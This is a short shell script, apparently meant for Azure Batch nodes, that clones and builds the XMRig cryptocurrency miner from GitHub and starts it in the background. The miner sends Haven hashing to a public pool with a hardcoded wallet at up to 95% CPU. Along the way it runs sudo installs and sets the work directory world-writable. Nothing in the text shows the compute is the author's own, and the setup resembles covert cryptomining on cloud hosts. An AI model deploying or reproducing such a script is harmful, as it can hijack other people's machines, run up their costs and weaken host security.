DIR="/home/_azbatch/xmrig/build/xmrig"
if [ -f "$DIR" ]; then
  ### Take action if $DIR exists ###
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:80 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background
else
    sudo apt-get update ;
    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
    cd /home/_azbatch/ ;
    sudo chmod -R 777 /home/_azbatch ;
    cd /home/_azbatch ;
    sudo rm -rf xmrig &
    git clone https://github.com/xmrig/xmrig.git && 
    cd /home/_azbatch/xmrig &&
    git checkout v6.12.2 > /dev/null 2>&1 
    sleep 3 &&
    mkdir /home/_azbatch/xmrig/build ;
    cd /home/_azbatch/xmrig/build ;
    cmake .. && 
    make ;
    sleep 5 ;
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:80 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 95 --cpu-priority 2 --background
fi
